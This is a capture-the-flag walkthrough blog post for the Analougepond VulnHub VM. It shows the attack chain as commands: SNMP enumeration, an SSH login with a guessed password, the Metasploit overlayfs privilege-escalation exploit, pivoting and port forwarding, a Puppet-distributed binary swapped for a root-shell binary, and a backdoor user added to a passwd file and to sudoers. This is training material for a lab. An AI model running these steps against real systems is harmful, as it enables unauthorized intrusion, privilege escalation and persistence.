<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Analougepond VM (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-analougepond-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2017-08-18T10:49:14+00:00">August 18, 2017</time><time class="updated" datetime="2025-06-10T20:30:08+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends! Today we are going to take another CTF channeling known as Analougepond which Based on our previous article “<a href="http://www.hackingarticles.in/ssh-pivoting-using-meterpreter/">SSH pivoting</a>”, if you are aware of ssh pivoting then you can easily breach this vm machine.</span></p>
<p><span style="color: #000000;">The credit for making this vm machine goes to “Knightmare” and it is another boot to root machine where author has hide flag for attacker as the new challenge.</span></p>
<p><span style="color: #000000;"><strong> </strong><strong>Lets Breach!!!</strong></span></p>
<p><span style="color: #000000;"><strong> </strong>The target holds 192.168.0.108 as network IP; now using nmap lets find out open ports.</span></p>
<pre class="lang:default decode:true">nmap -sT -sU 192.168.0.108
</pre>
<p><span style="color: #000000;">From give image you can check port<strong> 22</strong> for <strong>SSH</strong>, <strong>68</strong> for <strong>DHCP</strong> and <strong>161</strong> for <strong>SNMP</strong> are open in target network.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-BqdU-R3J1zM/WZa5dR8k3rI/AAAAAAAAQ5E/ZbiwVkkbA4ok9YE1NM3vjTHXk2Ydj_RwACEwYBhgL/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Now let’s enumerate for SNMP enumeration using metasploit</span></p>
<p><span style="color: #000000;">This module allows enumeration of any devices with SNMP protocol support. It supports hardware, software, and network information. The default community used is “public”</span></p>
<pre class="lang:default decode:true">use auxiliary/scanner/snmp/snmp_enum
msf auxiliary(snmp_enum) &gt; set rhosts 192.168.0.108
msf auxiliary(snmp_enum) &gt; set threads 5
msf auxiliary(snmp_enum) &gt; exploit</pre>
<p><span style="color: #000000;"><strong> </strong>From given image you can read system information, like host IP, hostname, description and etc. you will notice that here I had highlighted contact which contain a name <strong>Eric Burdon</strong> and location which contains some text “<strong>there is a hose in New Orleans they call it………</strong>”</span></p>
<p><span style="color: #000000;">Here eric could be a hint for username, now let ask from Google for “there is a hose in New Orleans they call it………”.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VYDAR6Ery70/WZa5gf5ZcUI/AAAAAAAAQ5o/1YQ9Tgq9X_oSLTUgUaY-TEy2fUsiE68nQCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">So when I search for given text in Google, I found that these texts are the lyric of a poem “<strong>The House of Rising Sun</strong>”. It might be possible that the author knightmare wants to give some password clue through this poem. From given image you can read the highlighted text “<strong>the Rising Sun</strong>” which could be the password for SSH.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XHnPrhG5Rxs/WZa5jnqjkRI/AAAAAAAAQ6U/_30-UFfji-0qgWZHXtHD1ztSvLDZgcTIgCEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Now let’s enumerate for SSH login using metasploit</span></p>
<p><span style="color: #000000;">This module will test ssh logins on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access.</span></p>
<pre class="lang:default decode:true ">use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) &gt; set rhost 192.168.0.108
msf auxiliary(ssh_login) &gt; set username eric
msf auxiliary(ssh_login) &gt; set password therisingsun
msf auxiliary(ssh_login) &gt;exploit</pre>
<p><span style="color: #000000;">As result we had successfully login and obtained <strong>command shell session 1</strong>of targeted system, more found install version of ubuntu i.e. <strong>14.04.1</strong></span></p>
<p><span style="color: #000000;">If you will search in Google you will come to know that ubuntu 14.04.1 is exploitable to <strong>overlayfs privilege escalation</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/--k8gUmOS7KE/WZa5nFt5AlI/AAAAAAAAQ7I/RpnECG92p-IhtQLswaJk_Dlth-jPC5bSQCEwYBhgL/s1600/6.png"/></span></p>
<p><span style="color: #000000;">This module attempts to exploit two different CVEs related to overlayfs. CVE-2015-1328: Ubuntu specific -&gt; 3.13.0-24 (14.04 default) &lt; 3.13.0-55 3.16.0-25 (14.10 default) &lt; 3.16.0-41 3.19.0-18 (15.04 default) &lt; 3.19.0-21 CVE-2015-8660: Ubuntu: 3.19.0-18 &lt; 3.19.0-43 4.2.0-18 &lt; 4.2.0-23 (14.04.1, 15.10) Fedora: &lt; 4.2.8 (vulnerable, un-tested) Red Hat: &lt; 3.10.0-327 (rhel 6, vulnerable, un-tested)</span></p>
<pre class="lang:default decode:true ">use exploit/linux/local/overlayfs_priv_esc
msf exploit(overlayfs_priv_esc) &gt; set  lhost 192.168.0.105
msf exploit(overlayfs_priv_esc) &gt; set session 1
msf exploit(overlayfs_priv_esc) &gt; exploit -j</pre>
<p><span style="color: #000000;">This times also we had successfully got command <strong>shell session 2</strong> opened of target system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-sj5eelYSg1A/WZa5nUPR--I/AAAAAAAAQ7M/_R64ceC5bV0-3KxdmMPomoJH3auWQ1JtACEwYBhgL/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Now convert command shell (for session 2) into meterpreter shell using following command</span></p>
<p><span style="color: #000000;"><strong>sessions -u 2</strong></span></p>
<p><span style="color: #000000;">This will a new session which <strong>session 3</strong> for meterpreter shell</span></p>
<p><span style="color: #000000;"><strong>meterpreter&gt; ls </strong></span></p>
<p><span style="color: #000000;"><strong>meterpreter&gt; cat flag.txt</strong></span></p>
<p><span style="color: #000000;">We have Captured <strong>1<sup>st</sup> flag</strong> successfully!!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VqMeszYY6VQ/WZa5nwSpv1I/AAAAAAAAQ7Q/GgDP9Js74rgpKBLM9p8RpWjxixvduurXgCEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">When as check network interface configuration in target system I found a new <strong>IP 192.168.122.1</strong> on its 3<sup>rd</sup> interface as shown in given image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-bzGvlStNT3A/WZa5oGmPxaI/AAAAAAAAQ7U/F0zJ66NthGkGs3RBIwHqRhX74gRE-QRtACEwYBhgL/s1600/9.png"/></span></p>
<p><span style="color: #000000;">This module manages session routing via an existing Meterpreter session. It enables other modules to ‘pivot’ through a compromised host when connecting to the named NETWORK and SUBMASK. Autoadd will search a session for valid subnets from the routing table and interface list then add routes to them. Default will add a default route so that all TCP/IP traffic not specified in the MSF routing table will be routed through the session when pivoting.</span></p>
<pre class="lang:default decode:true">msf &gt; use post/multi/manage/autoroute 
msf post(autoroute) &gt; set subnet 192.168.122.0
msf post(autoroute) &gt; set session 3
msf post(autoroute) &gt; exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-3rsbO1vcq_4/WZa5dOwJF8I/AAAAAAAAQ48/c_cKxjl2YQUoHYUD-uwG_Cu0JDyZ94RYACEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">meterpreter &gt;<strong> arp</strong></span></p>
<p><span style="color: #000000;">Here you can check all IP and MAC address, <strong>192.168.122.2</strong> and <strong>192.168.122.3</strong> will be another target.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-evj5YpYHxx8/WZa5daXGMyI/AAAAAAAAQ5A/HDWtHjMlr5smk38pfeJ2ROOEmC-e1cZ9QCEwYBhgL/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Enumerate open TCP services by performing a full TCP connect on each port. This does not need administrative privileges on the source machine, which may be useful if pivoting.</span></p>
<pre class="lang:default decode:true ">use auxiliary/scanner/portscan/tcp
msf auxiliary(tcp) &gt; set rhost 192.168.122.2
msf auxiliary(tcp) &gt; set 1-500
msf auxiliary(tcp) &gt; set thread 10
msf auxiliary(tcp) &gt; exploit</pre>
<p><span style="color: #000000;">From result we found <strong>port 22</strong> is <strong>open </strong>which used for SSH.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-7gd9hWeEF6Q/WZa5eN9r7xI/AAAAAAAAQ5I/V87jUs_QPE4tIOqLrhCp326c4JAWfVP5wCEwYBhgL/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Move inside into meterperer shell then type following command for port forwarding of port 22 into port 8000 as shown below:</span></p>
<pre class="lang:default decode:true">sessions 3
portfwd add -l 8000 -p 22 -r 192.168.122.2</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-XsASjQCInaY/WZa5eS51AbI/AAAAAAAAQ5Q/cpEexE_2a1AFHHd848qGXfCJZtwL2bGfQCEwYBhgL/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Now login into SSH server through localhost with forwarded port</span></p>
<pre class="lang:default decode:true">ssh localhost -p 8000</pre>
<p><span style="color: #000000;">From given image you can read the massage again it is a hint for username as “<strong>sandieshaw</strong>”; now let ask from Google for his famous song to get some hint for password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/--0rXuqOPFCM/WZa5eXZ1MtI/AAAAAAAAQ5M/GxaaxVWqkZcbyMguH0_ivo7d3lubTCD4gCEwYBhgL/s1600/14.png"/></span></p>
<p><span style="color: #000000;">After searching on google we guessed that the password should be sandieshaw’s famous song “<strong>puppetonastring</strong>”.</span></p>
<p><span style="color: #000000;">Now with this password we connect to <strong>sandieshaw</strong> through <strong>ssh</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-uNUcyV2Dyd4/WZa5evyAlsI/AAAAAAAAQ7c/tMH26AM8UXEDkVa5M7nHR8FkCuP5TFBUgCEwYBhgL/s1600/15.png"/></span></p>
<p><span style="color: #000000;">After connecting to <strong>sandieshaw</strong> through ssh we found that we have to root this system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-RiIx6Yd0XgU/WZa5fRYjPsI/AAAAAAAAQ7c/vxXSMgPx_V4coHlMd7HYZFnQ8Ckvu3ScACEwYBhgL/s1600/16.png"/></span></p>
<p><span style="color: #000000;">After looking through the files on this system we found that <strong>Puppet </strong>is running on this system.</span></p>
<p><span style="color: #000000;">Among those files we find that a puppet file contains instructions to copy <strong>spin </strong>file in root access after ensuring it is present in the <strong>/tmp/ </strong>folder of the system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2V_TLsHDoFc/WZa5fcy8BZI/AAAAAAAAQ7c/A_a3zvOiQvMEmCEB3147w2S17MeB2xBFgCEwYBhgL/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Then we go into the files folder we found two files one in c language and another an executable file.  Opening the c file, we found it is the code for spinning pipe. Now we replace the c executable file with our file that gives the root access to the system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dm1k44lPeK0/WZa5fu0JCaI/AAAAAAAAQ7c/9hFyCylzwTQL-uIH93IbrGeAlNQmorWUwCEwYBhgL/s1600/18.png"/></span></p>
<p><span style="color: #000000;">The puppet file should execute this as root user and we will get the root shell to server.</span></p>
<p><span style="color: #000000;">We then come back to the meterpreter shell and upload it to the current user <strong>eric.</strong></span></p>
<p><span style="color: #000000;"><strong>meterpreter &gt; upload /root/Desktop/spin.c</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ALmYYCs6ZPQ/WZa5gAdM9mI/AAAAAAAAQ7c/1fMrliAdKksTstQ3GQYjN-3C8f-Rt6YFwCEwYBhgL/s1600/19.png"/></span></p>
<p><span style="color: #000000;">After upload it into the system we compile it and send it to the <strong>sandieshaw </strong>using ssh.</span></p>
<pre class="lang:default decode:true">scp spin sandieshaw@192.168.122.2:/home/sandieshaw</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-XaszjXDaG2s/WZa5ghHk2cI/AAAAAAAAQ7c/0dN0zfpBrEQ3J2_idV_M2ko-MajDl5yXACEwYBhgL/s1600/20.png"/></span></p>
<p><span style="color: #000000;">Now we replace the <strong>spin </strong>file in the <strong>/etc/puppet/modules/wiggle/files/</strong> with our <strong>spin </strong>file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-TG8Yl0J_ZO4/WZa5hKABQQI/AAAAAAAAQ7c/x7mFlvzhiKEiynn8Fh95of0Qle9PL8gHwCEwYBhgL/s1600/21.png"/></span></p>
<p><span style="color: #000000;">The spin is replaced, now we have to wait for the puppet file to replace our spin file to that in <strong>/tmp/</strong></span></p>
<p><span style="color: #000000;">After waiting for some time we execute the spin file present in <strong>/tmp/ </strong>folder.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-8tk4VAqpya8/WZa5hAkds-I/AAAAAAAAQ7c/Tq3YADOUiioG6j2rkSaXDOuEVWcUX2kUgCEwYBhgL/s1600/22.png"/></span></p>
<p><span style="color: #000000;">Now we have the root shell, moving into the <strong>/root/protovision</strong> folder we found a flag that is <strong>hexadecimal</strong> format.</span></p>
<p><span style="color: #000000;">After converting it we found a base64 encoded inverse string.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-g-_9-iO7Q1s/WZa5hR3-iGI/AAAAAAAAQ7c/Xz6Kzca04rsPzc_4q89uBgO3wHfZBJPAACEwYBhgL/s1600/23.png"/></span></p>
<p><span style="color: #000000;">After reversing the string and decoding it we found that it was a link to a youtube video.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZyXxaebgdZk/WZa5h_ZdxrI/AAAAAAAAQ7c/7XMWrKb3o8g1zh6u97IMoImZ9KUsXs-swCEwYBhgL/s1600/24.png"/></span></p>
<p><span style="color: #000000;">Then we moved on to the other files <strong>jim </strong>and <strong>melvin </strong>didn’t had anything significant so we moved to the folder <strong>.I_have_you_now</strong>. There we found a folder <strong>.a, </strong>to check how many folders were there inside we searched for all the folders inside with command:</span></p>
<pre class="lang:default decode:true">find . -type d</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-3i4DSTcvrLk/WZa5iINoU8I/AAAAAAAAQ7c/rOChvEjca0I1FmQAwcCUr1GiYJtF6dV4gCEwYBhgL/s1600/25.png"/></span></p>
<p><span style="color: #000000;">We found that it goes all the way to <strong>.z, </strong>we move to this location to see its content.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Qbu5HV2CJ60/WZa5ibSgD8I/AAAAAAAAQ7c/3tiym5pFLOoZu4Eo6yfjR32hsQJmTSoNQCEwYBhgL/s1600/26.png"/></span></p>
<p><span style="color: #000000;">We found two files one in <strong>gpg </strong>encryption and another readable file then we decode this file using command:</span></p>
<pre class="lang:default decode:true">gpg nleeson_key.gpg</pre>
<p><span style="color: #000000;">This will ask a passphrase, the password is <strong>secret </strong>which is hinted in the video.</span></p>
<p><span style="color: #000000;">Opening the file we found that it was a private key. So we removed the permissions of the file using:</span></p>
<p><span style="color: #000000;"><strong>chmod 600 nleeson_key</strong></span></p>
<p><span style="color: #000000;">Then we look at the content of the other file it displayed a single word <strong>joshua.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EGHfTpuwYh4/WZa5i9CMb3I/AAAAAAAAQ7c/XhLFasCx9xU3JddK3OXkWP54O7TuutUgACEwYBhgL/s1600/27.png"/></span></p>
<p><span style="color: #000000;">During our network scan we found another ip <strong>192.168.122.3</strong> that had ssh open but we couldn’t connect to it.</span></p>
<p><span style="color: #000000;">Now we try to connect to it using the private key we found.</span></p>
<p><span style="color: #000000;">After guessing a few users we found that <strong>nleeson</strong> was the user for the system.</span></p>
<p><span style="color: #000000;">using the key will ask for a passphrase and the password is <strong>joshua.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-JibHjVuVD5I/WZa5i6D2yyI/AAAAAAAAQ7c/IXEyj0njoeMXJuwGphhUnNAUXDW1URDqwCEwYBhgL/s1600/28.png"/></span></p>
<p><span style="color: #000000;">We connected to the system <strong>192.168.122.3</strong>. After looking around we couldn’t find anything, so we went back into the root of <strong>192.168.122.2</strong>. Here after looking through the files we found that <strong>192.168.122.2</strong> was the puppet server and <strong>192.168.122.3</strong> was the puppet client. We found a file called <strong>barringsbank-passwd</strong> that held all the username and password of<strong> 192.168.122.3</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-VEAa-_KlEvM/WZa5jE9Q4YI/AAAAAAAAQ7c/uW17m_m1e1Ax3z-XAI52RJSDuTz68G8kQCEwYBhgL/s1600/29.png"/></span></p>
<p><span style="color: #000000;">So we added a new user<strong> ignite</strong> to this file by opening this file in <strong>vim.</strong></span></p>
<p><span style="color: #000000;">Linux uses md5 salt hashes as password so we create an md5 hash using <strong>ignite </strong>and <strong>xyz </strong>as salt.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-9ou6xOnoJHg/WZa5j6MiV0I/AAAAAAAAQ7c/8QXPL8wCbUguqHePYVRVftAw3ll13NvYACEwYBhgL/s1600/30.png"/></span></p>
<p><span style="color: #000000;">Then we add our user to sudoers to gain root access.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-GqsnzCDrvoA/WZa5jzf8VNI/AAAAAAAAQ7c/ziprE0qxCVIZyBqOm_tkz6-zhBVslEs_wCEwYBhgL/s1600/31.png"/></span></p>
<p><span style="color: #000000;">Then we give our new user permissions same as root.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-c9VPvfRfwlY/WZa5kXRHGPI/AAAAAAAAQ7c/xL675w6Qo3kEWmh_U5MEBhlBVYnzzWa-gCEwYBhgL/s1600/32.png"/></span></p>
<p><span style="color: #000000;">Then we connect to <strong>192.168.122.3</strong> through ssh and using the username and password we just created.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1d81tf_AR7I/WZa5kZmmwnI/AAAAAAAAQ7c/nZWzpRJrd5UfW5ka5ix5j-jfQ8vT1TYAQCEwYBhgL/s1600/33.png"/></span></p>
<p><span style="color: #000000;">Now we have to wait for some time for the puppet server to update the sudoers, so that our user can have root access.</span></p>
<p><span style="color: #000000;">Then we go to root shell using <strong>sudo su.</strong></span></p>
<p><span style="color: #000000;">We move into the root folder and find an image file <strong>me.jpeg.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-DtThcGK65A0/WZa5kRAVl0I/AAAAAAAAQ7c/-e4skCnbqyYhW_zU4lawOSmOipWp1xFOgCEwYBhgL/s1600/34.png"/></span></p>
<p><span style="color: #000000;">We then copy the image file to eric using ssh.</span></p>
<pre class="lang:default decode:true">scp me.jpeg eric@192.168.1.119:/home/eric/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-mfyXExRQCuM/WZa5lfEksNI/AAAAAAAAQ7c/yCyk1DtMoJ8olWtytTaW7_noqrOiBvP2wCEwYBhgL/s1600/35.png"/></span></p>
<p><span style="color: #000000;">Then we download the file from eric to our local system through <strong>metasploit. </strong>We go to our meterpreter shell and download the <strong>me.jpeg </strong>to our system.</span></p>
<p><span style="color: #000000;"><strong>meterpreter &gt; cd eric/</strong></span></p>
<p><span style="color: #000000;"><strong>meterpreter &gt; download me.jpeg /root/Desktop/</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-vX_8M1ACZK8/WZa5lRBIdpI/AAAAAAAAQ7c/e_mSSP1vVZw-dzvP4dG5MJK6VrM_x8PfgCEwYBhgL/s1600/36.png"/></span></p>
<p><span style="color: #000000;">We used to exiftool on this file and found nothing so we performed steganography using <strong>steghide.</strong></span></p>
<p><span style="color: #000000;">First we check if there is any file hidden behind this image using command:</span></p>
<p><span style="color: #000000;"><strong>steghide –info me.jpeg</strong></span></p>
<p><span style="color: #000000;">The passphrase to this file is <strong>reticulatingsplines</strong>, I found it after various attempts.</span></p>
<p><span style="color: #000000;">Performing steganography we found a file hidden text file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Vp-g4mGdDAA/WZa5mPT7i2I/AAAAAAAAQ7c/TT40hRnDd18r91WlSFAMzWEJg_31-HY3ACEwYBhgL/s1600/38.1.png"/></span></p>
<p><span style="color: #000000;">We extract the text file using steghide, we use the following command:</span></p>
<p><span style="color: #000000;"><strong>steghide extract -sf me.jpeg</strong></span></p>
<p><span style="color: #000000;">It will again ask for an password i.e. <strong>reticulatingsplines</strong>.</span></p>
<p><span style="color: #000000;">After extracting the file we found that it is encrypted in hexadecimal format.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-txGm0LFWNLA/WZa5mdMxLHI/AAAAAAAAQ7c/aiG2rc0OnqwM1sQSCoPZcQ7pjLA7kNu4ACEwYBhgL/s1600/38.png"/></span></p>
<p><span style="color: #000000;">After converting the file from hexadecimal we found that the text was again encrypted in base64 format.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-BdUjGQuTFco/WZa5mHP0fBI/AAAAAAAAQ7c/cqhubec20BIODbqnG7do7ZIHekRx5Op7wCEwYBhgL/s1600/39.png"/></span></p>
<p><span style="color: #000000;">The text contains recurring <strong>gACI </strong>phrase that doesn’t allow it to be converted from base64 format.</span></p>
<p><span style="color: #000000;">After removing it we found that the text was inversed after reversing and decoding it we got the final flag.</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-282UaBB5JGA/WZa5nOWir-I/AAAAAAAAQ7c/3Cuw2-RuaTMN4qxF3mUv_MIHpJApm6RbACEwYBhgL/s1600/40.png"/></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact <a href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
